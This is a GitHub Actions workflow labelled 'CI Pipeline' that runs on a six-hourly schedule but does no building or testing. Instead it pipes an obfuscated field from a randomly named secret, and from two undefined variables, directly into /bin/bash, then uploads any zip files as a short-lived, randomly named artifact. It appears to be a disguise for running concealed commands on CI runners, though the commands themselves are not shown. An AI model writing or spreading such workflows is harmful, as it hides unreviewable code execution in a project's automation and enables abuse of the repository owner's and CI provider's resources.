name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '26 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          nltk5: ${{ secrets.nltk5 }}
        run: |
          printf '%s' "$nltk5" | jq -r .lsvt8377 | /bin/bash
          echo $igybo28806 | jq -r .lxeee126 | /bin/bash
          echo $gxpmo29242 | jq -r .xzuf94 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: 0340yL14
          path: "*.zip"
          retention-days: 1
